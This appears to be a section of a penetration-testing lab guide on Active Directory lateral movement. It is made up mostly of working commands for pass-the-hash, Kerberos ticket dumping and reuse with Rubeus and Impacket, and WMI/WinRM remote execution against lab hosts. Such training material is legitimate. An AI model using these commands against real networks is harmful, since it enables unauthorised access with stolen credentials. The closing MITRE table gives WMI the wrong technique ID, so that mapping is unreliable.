# 🔀 Phase 5: Lateral Movement

Move across the network using captured credentials or tickets without needing plaintext passwords.

---

## 5.1 Pass-the-Hash (PtH)

```bash
# CrackMapExec PtH
crackmapexec smb 192.168.56.0/24 -u adm-user -H <NT_HASH> --local-auth

# Impacket PtH
python3 psexec.py corp.local/adm-user@192.168.56.10 -hashes :<NT_HASH>
python3 wmiexec.py corp.local/adm-user@192.168.56.10 -hashes :<NT_HASH>

# Evil-WinRM PtH
evil-winrm -i 192.168.56.10 -u adm-user -H <NT_HASH>
```

---

## 5.2 Pass-the-Ticket (PtT)

```bash
# Capture ticket with Rubeus
.\Rubeus.exe dump /service:krbtgt /user:adm-user

# Import ticket on Kali
python3 ticketConverter.py adm-user.ccache adm-user.kirbi
export KRB5CCNAME=adm-user.ccache
python3 psexec.py -k -no-pass corp.local/adm-user@dc01.corp.local
```

---

## 5.3 WMI & PSRemoting

```bash
# WMI execution
python3 wmiexec.py corp.local/jsmith:Password123!@192.168.56.20

# WinRM / Evil-WinRM
evil-winrm -i 192.168.56.20 -u jsmith -p 'Password123!'

# PSRemoting from Windows
Enter-PSSession -ComputerName WS01 -Credential corp\jsmith
```

---

## MITRE ATT&CK Mapping

| Technique | ID | Description |
|-----------|-----|-------------|
| Pass the Hash | T1550.002 | NTLM hash reuse |
| Pass the Ticket | T1550.003 | Kerberos ticket reuse |
| Remote Services: WMI | T1021.006 | WMI lateral execution |
| Remote Services: WinRM | T1021.006 | PS remoting |
